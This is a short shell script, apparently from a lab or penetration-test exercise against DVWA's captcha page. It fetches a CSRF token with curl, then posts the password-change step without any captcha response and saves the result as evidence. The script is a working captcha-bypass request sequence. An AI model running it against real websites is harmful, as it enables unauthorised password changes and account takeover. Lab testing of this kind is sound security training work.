# Captcha bypass at LOW: submit step=2 directly with a fresh user_token from step=1 (no g-recaptcha-response needed).
CK='PHPSESSID=37451a4e56484ab7fe32cdd9b205d7ed'
B='http://10.31.0.87:3000'

# step=1 fetch to get token
curl -s -b "$CK; security=low" "$B/vulnerabilities/captcha/" -o /tmp/cap1
TOK=$(grep -oE "user_token' value='[0-9a-f]{32}" /tmp/cap1 | grep -oE '[0-9a-f]{32}' | head -1)
echo "step1 token=$TOK"

# now step=2 WITHOUT g-recaptcha-response
curl -s -b "$CK; security=low" "$B/vulnerabilities/captcha/" \
  --data-urlencode 'step=2' \
  --data-urlencode 'password_new=captchapwn1' \
  --data-urlencode 'password_conf=captchapwn1' \
  --data-urlencode 'Change=Change' \
  --data-urlencode "user_token=$TOK" -o evidence/captcha/captcha-low-step2-nocaptcha-response.html -w 'step2-no-captcha: %{http_code}\n'
grep -oE 'Password Changed|That password did NOT match|You did not pass the captcha|did not match|CSRF' evidence/captcha/captcha-low-step2-nocaptcha-response.html | head -3
